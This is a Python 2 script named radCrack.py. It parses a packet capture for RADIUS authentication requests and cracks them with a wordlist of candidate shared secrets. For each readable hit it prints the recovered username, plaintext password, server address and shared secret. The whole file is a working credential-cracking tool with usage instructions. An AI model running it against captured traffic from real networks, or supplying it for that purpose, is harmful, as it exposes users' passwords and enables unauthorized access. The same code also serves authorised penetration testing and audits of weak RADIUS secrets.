import sys
import hashlib
import dpkt
import socket

# Preforms one iteration of radius decryption
def rad_decrypt(sec,auth,crypt):
  m = hashlib.md5()
  m.update(sec+auth)
  m = m.digest()
  password = ""
  for i in range(len(crypt)):
    password += chr(ord(m[i])^ord(crypt[i]))
  return password  

# returns true if a string is readable ascii
def is_ascii(s):
  return all((ord(c) < 128 and ord(c) >31) or ord(c)==0 for c in s)


# Returns a list of radius packets, ip address pairs
def get_auth_packets(pcapFile):
  radPacket = []
  p = open(pcapFile, "rb")
  pcap = dpkt.pcap.Reader(p)
  for ts, buf in pcap:
    eth= dpkt.ethernet.Ethernet(buf)
    ip = eth.data
    udp = ip.data
    if type(udp)==dpkt.udp.UDP and udp.dport==1812:
      radPacket.append((udp.data,ip.dst))
  p.close()
  print "[*] Found "+str(len(radPacket))+" Radius Packets"
  return radPacket


# Primary function that takes a pcap file and list of secrets
# and cracks them
def crack_pcap(secretlist, pcapFile):
  print "\n[*] Cracking Radius Packets..."  
  for udpdata, ipdst in get_auth_packets(pcapFile):
    auth = udpdata[4:20]
    cur = 20
    curlen = ord(udpdata[cur+1:cur+2])
    username = "Not Found"
    while ord(udpdata[cur:cur+1])!=2:
      if ord(udpdata[cur:cur+1])==1:
        username = udpdata[cur+2:cur+curlen]
      cur += curlen
      curlen = ord(udpdata[cur+1:cur+2])
    crypt = udpdata[cur+2:cur+curlen]
    all_passwords = {}
    for secret in secretlist:
      secret = secret.strip()
      curpass = auth
      password = ""
      i = 0
      while i < len(crypt):
        password += rad_decrypt(secret,curpass,crypt[i:i+16])
        curpass = crypt[i:i+16]
        i+=16
      if is_ascii(password):
        all_passwords[secret]=password
        print " "
        print "[*] Possible Radius Password Found"
        print "[*] Radius Server: "+socket.inet_ntoa(ipdst)
        print "[*] Username: "+username          
        print "[*] Password: "+password
        print "[*] Shared Secret: "+secret  
        print " "


  print "[*] DONE "
  return (username, all_passwords)

def usage():
  print "[*] USAGE:"
  print "python radCrack.py sharedsecret pcapfile"
  print " or "
  print "python radCrack.py -w secretlist pcapfile"
  print " "



if len(sys.argv)==4 and sys.argv[1] == "-w":
  if sys.argv[2] == "-":
    f = sys.stdin
  else:
    f = open(sys.argv[2])
  secrets = f.readlines()
  file = sys.argv[3]
  f.close()
  crack_pcap(secrets, file)
elif len(sys.argv)==3:
  secret = sys.argv[1]
  file = sys.argv[2]
  crack_pcap([secret], file)
else:
  usage()
